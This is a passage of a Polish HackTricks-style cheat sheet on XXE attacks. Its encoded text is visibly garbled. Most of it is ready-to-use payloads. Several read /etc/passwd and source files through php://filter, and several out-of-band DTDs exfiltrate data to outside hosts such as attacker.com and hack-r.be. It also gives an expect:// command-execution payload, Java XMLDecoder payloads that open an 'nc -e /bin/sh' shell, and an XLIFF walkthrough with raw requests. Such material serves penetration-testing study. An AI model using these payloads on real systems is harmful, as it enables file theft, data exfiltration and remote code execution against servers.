Mo偶esz u偶y \[**"Przepisu na kodowanie**" cyberchef tutaj ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) przeksztaci na UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass protokou File:/

Jeli strona internetowa u偶ywa PHP, zamiast u偶ywa `file:/`, mo偶esz u偶y **obudow PHP** `php://filter/convert.base64-encode/resource=`, aby **uzyska dostp do wewntrznych plik贸w**.

Jeli strona internetowa u偶ywa Javy, mo偶esz sprawdzi [**protok贸 jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Encje HTML

Sztuczka z [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Mo偶esz utworzy **encj wewntrz encji**, kodujc j za pomoc **encji HTML**, a nastpnie wywoa j, aby **zaadowa dtd**.\
Nale偶y zauwa偶y, 偶e u偶ywane **encje HTML** musz by **numeryczne** (jak w tym przykadzie \[w tym przykadzie]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Przykad DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappery

### Base64

**Wycignij** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Wyodrbnianie zewntrznego zasobu**

An XML External Entity (XXE) attack is a type of vulnerability that allows an attacker to extract data from the server or perform other malicious actions by exploiting the way XML parsers process external entities. 

During an XXE attack, the attacker injects a specially crafted XML input that contains a reference to an external entity. This entity can be a local file, a remote file, or even a URL. When the XML parser processes the input, it resolves the external entity reference and retrieves its content. 

To extract an external resource using XXE, the attacker needs to identify a vulnerable XML parser and inject the malicious XML input. The attacker can then observe the response from the server to extract the desired information. 

There are several techniques that can be used to extract external resources through XXE attacks, including:

- **File Inclusion**: The attacker can reference a local file on the server and retrieve its content.
- **Remote File Inclusion**: The attacker can reference a remote file and retrieve its content.
- **URL Invocation**: The attacker can reference a URL and retrieve its content.
- **Out-of-Band (OOB) Retrieval**: The attacker can use XXE to send data to an external server controlled by them, allowing them to retrieve the data through a different channel.

To prevent XXE attacks, it is important to properly configure XML parsers and disable the processing of external entities. Additionally, input validation and sanitization should be implemented to prevent malicious XML input from being processed.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Wykonywanie zdalnego kodu

**Jeli modu "expect" w PHP jest zaadowany**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) jest protokoem komunikacyjnym wykorzystywanym do wymiany danych midzy aplikacjami. Jednak偶e, SOAP mo偶e by podatny na ataki XEE (XML External Entity), kt贸re pozwalaj na odczytanie danych z serwera lub wykonanie zdalnego kodu.

Atak XEE wykorzystuje podatno w przetwarzaniu danych XML przez serwer SOAP. Atakujcy mo偶e wstrzykn zoliwe treci XML, kt贸re zawieraj zewntrzne encje XML. Gdy serwer pr贸buje przetworzy te encje, mo偶e spowodowa odczytanie danych z plik贸w systemowych lub wykonanie kodu na serwerze.

Aby przeprowadzi atak XEE na serwer SOAP, atakujcy musi znale藕 miejsce, w kt贸rym serwer przetwarza dane XML. Nastpnie, atakujcy mo偶e wstrzykn zoliwe treci XML, kt贸re zawieraj zewntrzne encje XML, takie jak `<!DOCTYPE>`, `<!ENTITY>`, `<!ATTLIST>`, itp.

Przykad ataku XEE na serwer SOAP:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <foo>&xxe;</foo>
  </soapenv:Body>
</soapenv:Envelope>
```

W powy偶szym przykadzie, atakujcy wstrzykuje zewntrzn encj `xxe`, kt贸ra odczytuje zawarto pliku `/etc/passwd`. Serwer SOAP, pr贸bujc przetworzy t encj, odczytuje zawarto pliku i zwraca j w odpowiedzi.

Aby zabezpieczy serwer SOAP przed atakami XEE, nale偶y:

- Wyczy przetwarzanie zewntrznych encji XML.
- Sprawdzi i filtrowa dane wejciowe XML, aby wykry i zablokowa potencjalnie zoliwe treci.
- U偶ywa narzdzi do testowania penetracyjnego, takich jak OWASP ZAP, do wykrywania podatnoci XEE i innych podobnych atak贸w.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ten przykad jest inspirowany [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) jest wykorzystywany do standaryzacji wymiany danych w procesach lokalizacji. Jest to format oparty na XML, g贸wnie u偶ywany do transferu danych lokalizowalnych midzy narzdziami podczas lokalizacji oraz jako wsp贸lny format wymiany dla narzdzi CAT (Computer-Aided Translation).

### Analiza 偶dania w trybie lepego testowania

Wysyane jest 偶danie do serwera z nastpujc zawartoci:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Jednak偶e, to 偶danie powoduje wewntrzny bd serwera, wskazujcy konkretnie na problem z deklaracjami znacznik贸w:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Pomimo bdu, na Burp Collaborator jest zarejestrowane trafienie, wskazujce na pewien poziom interakcji z zewntrzn jednostk.

Wyciek danych poza pasmem
Aby wyciec dane, wysyane jest zmodyfikowane 偶danie:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ta metoda ujawnia, 偶e User Agent wskazuje na u偶ycie Javy 1.8. Zauwa偶ono ograniczenie tej wersji Javy, polegajce na niemo偶noci pobrania plik贸w zawierajcych znak nowej linii, takich jak /etc/passwd, za pomoc techniki Out of Band.

Eksfiltracja danych oparta na bdach
Aby przezwyci偶y to ograniczenie, stosuje si podejcie oparte na bdach. Plik DTD jest strukturalnie zbudowany w taki spos贸b, aby wywoa bd, kt贸ry zawiera dane z docelowego pliku:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Serwer odpowiada bdem, istotnie odzwierciedlajc nieistniejcy plik, co wskazuje, 偶e serwer pr贸buje uzyska dostp do okrelonego pliku:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Aby doczy zawarto pliku do komunikatu o bdzie, plik DTD jest dostosowywany:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ta modyfikacja prowadzi do udanej ekstrakcji zawartoci pliku, co jest odzwierciedlone w bdzie wysanym za pomoc protokou HTTP. Wskazuje to na udany atak XXE (XML External Entity), wykorzystujcy techniki Out of Band i Error-Based do wydobycia poufnych informacji.


## RSS - XEE

Poprawny XML w formacie RSS do wykorzystania podatnoci XXE.

### Ping back

Prosty 偶danie HTTP do serwera atakujcego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Odczyt pliku

W przypadku ataku na XML External Entity (XXE) mo偶na wykorzysta funkcj odczytu pliku. Aby to zrobi, nale偶y utworzy odpowiednio spreparowany plik XML, kt贸ry zawiera zewntrzn encj, wskazujc na plik, kt贸ry chcemy odczyta.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

W powy偶szym przykadzie plik XML zawiera zewntrzn encj `xxe`, kt贸ra wskazuje na plik `/etc/passwd`. Po przetworzeniu tego pliku przez parser XML, zawarto pliku `/etc/passwd` zostanie zwr贸cona jako cz odpowiedzi.

Ten atak mo偶e by wykorzystany do odczytu innych plik贸w na serwerze, takich jak pliki konfiguracyjne, klucze prywatne, czy nawet poufne dane.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Odczytaj kod 藕r贸dowy

Za pomoc filtra PHP base64
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE do RCE

XMLDecoder to klasa Javy, kt贸ra tworzy obiekty na podstawie wiadomoci XML. Jeli zoliwy u偶ytkownik mo偶e zmusi aplikacj do u偶ycia dowolnych danych w wywoaniu metody **readObject**, natychmiast uzyska wykonanie kodu na serwerze.

### U偶ycie Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder jest klas w jzyku Java, kt贸ra umo偶liwia tworzenie i kontrolowanie proces贸w systemowych. Mo偶e by u偶ywana do uruchamiania zewntrznych program贸w i wykonywania polece w systemie operacyjnym.

Aby u偶y ProcessBuildera, nale偶y utworzy now instancj tej klasy i przekaza jej polecenie, kt贸re chcemy wykona. Mo偶emy r贸wnie偶 ustawi inne parametry, takie jak zmienne rodowiskowe, katalog roboczy i strumienie wejcia/wyjcia.

Po utworzeniu obiektu ProcessBuilder, mo偶emy go uruchomi za pomoc metody `start()`. Spowoduje to uruchomienie procesu systemowego i zwr贸cenie obiektu klasy `Process`, kt贸ry reprezentuje ten proces.

Mo偶emy r贸wnie偶 u偶y metody `inheritIO()`, aby przekierowa strumienie wejcia/wyjcia procesu na strumienie wejcia/wyjcia bie偶cego procesu. Jest to przydatne, gdy chcemy zobaczy wynik dziaania uruchomionego programu w naszej konsoli.

Przykad u偶ycia ProcessBuildera:

```java
ProcessBuilder processBuilder = new ProcessBuilder("ls", "-l");
processBuilder.inheritIO();
Process process = processBuilder.start();
process.waitFor();
```

W powy偶szym przykadzie tworzymy nowy obiekt ProcessBuilder, kt贸ry uruchamia polecenie `ls -l` w systemie operacyjnym. Nastpnie przekierowujemy strumienie wejcia/wyjcia procesu na strumienie wejcia/wyjcia bie偶cego procesu za pomoc metody `inheritIO()`. Na koniec uruchamiamy proces i czekamy na jego zakoczenie za pomoc metody `waitFor()`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Narzdzia

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Odwoania

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Wyodrbnianie informacji za pomoc HTTP przy u偶yciu wasnego zewntrznego DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
